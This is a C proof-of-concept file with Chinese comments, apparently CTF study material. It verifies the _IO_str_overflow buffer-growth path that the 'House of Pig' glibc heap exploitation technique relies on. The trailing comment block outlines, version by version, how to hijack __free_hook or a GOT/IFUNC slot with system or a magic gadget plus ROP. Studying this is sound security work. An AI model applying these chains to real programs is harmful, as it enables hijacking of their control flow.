#define _GNU_SOURCE

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * glibc 2.28 起，_IO_str_overflow 不再调用 _IO_strfile 尾部的回调，
 * 而是直接执行下面的数据流：
 *
 *   new_size = 2 * old_blen + 100;
 *   new_buf = malloc(new_size);
 *   memcpy(new_buf, old_buf, old_blen);
 *   free(old_buf);
 *   memset(new_buf + old_blen, 0, new_size - old_blen);
 *
 * 完整 House of Pig 还要用 largebin / tcache-stashing 等原语控制 malloc
 * 返回位置，再选择 __free_hook 或构建相关终点。本 PoC 只验证所有版本
 * 共有且可独立复现的消费端（最终触发点），不伪造一个脱离题目接口的通用 RCE。
 */

int main(void)
{
    char *published_buffer = NULL;
    size_t published_size = 0;
    FILE *stream = open_memstream(&published_buffer, &published_size);
    assert(stream != NULL);

    char *old_buffer = stream->_IO_buf_base;
    size_t old_length = (size_t)(stream->_IO_buf_end - old_buffer);
    unsigned char *expected = malloc(old_length);
    assert(old_buffer != NULL);
    assert(old_length != 0);
    assert(expected != NULL);

    /*
     * 用非零、周期性数据填满旧缓冲区。扩容后逐字节比较，严格证明源码的
     * memcpy 已把 old_blen 字节搬到新分配，而不是只根据地址变化猜测。
     */
    for (size_t i = 0; i < old_length; ++i)
        expected[i] = (unsigned char)(0x41 + i % 23);
    memcpy(old_buffer, expected, old_length);

    stream->_IO_read_base = old_buffer;
    stream->_IO_read_ptr = old_buffer;
    stream->_IO_read_end = old_buffer;
    stream->_IO_write_base = old_buffer;
    stream->_IO_write_ptr = stream->_IO_buf_end;
    stream->_IO_write_end = stream->_IO_buf_end;

    /* write_ptr == write_end，故 fputc 必须调用合法 vtable 的 overflow。 */
    assert(fputc('P', stream) == 'P');

    char *new_buffer = stream->_IO_buf_base;
    size_t new_length = (size_t)(stream->_IO_buf_end - new_buffer);

    assert(new_buffer != NULL);
    assert(new_buffer != old_buffer);
    assert(new_length == 2 * old_length + 100);
    assert(memcmp(new_buffer, expected, old_length) == 0);

    /* memcpy 后的尾部先被 memset 清零，然后本次字符写到 old_blen 位置。 */
    assert(new_buffer[old_length] == 'P');
    for (size_t i = old_length + 1; i < new_length; ++i)
        assert(new_buffer[i] == '\0');
    assert(stream->_IO_write_ptr == new_buffer + old_length + 1);

    puts("[+] Pig：str 扩容链命中");

    free(expected);
    assert(fclose(stream) == 0);
    free(published_buffer);
    return 0;
}

/*
 * ======================== 各版本组合伪代码 ========================
 *
 * 本文件已真实验证 2.28～2.43 的 `_IO_str_overflow` 数据流：
 *
 *     old_blen = _IO_buf_end - _IO_buf_base；
 *     new_size = 2 * old_blen + 100；          // 100 是十进制
 *     new_buf = malloc(new_size)；
 *     memcpy(new_buf, old_buf, old_blen)；
 *     free(old_buf)；
 *
 * glibc 2.31～2.33 的经典组合：
 *
 *     让内部 malloc 返回 __free_hook 附近；
 *     old_buf 开头放 system 地址；
 *     memcpy 把 system 写进 hook；
 *     随后的 free(old_buf) 消费 hook；
 *
 * glibc 2.34～2.41 的 PLUS 只对特定构建负责：
 *
 *     old_len = 0x18；
 *     内部 malloc 请求 = 2 * 0x18 + 100 = 0x94；
 *     让该 malloc 返回附件中的 memset IFUNC/GOT 槽；
 *     old_buf 首 qword 放按附件反汇编得到的 magic gadget；
 *     补齐 fake chunk、锁、setcontext 和 ROP 字段；
 *     逐项检查 RELRO、IRELATIVE 槽、寄存器与 gadget 约束；
 *
 * glibc 2.42～2.43：最终扩容路径仍在，但经典 largebin 任意目标写已经
 * 失效。若题目另给 metadata hijacking、AAW 或 overlap，仍可把内部 malloc
 * 投递到目标；这属于换投递原语，不能宣称原 Pig 完整链原样存活。
 */
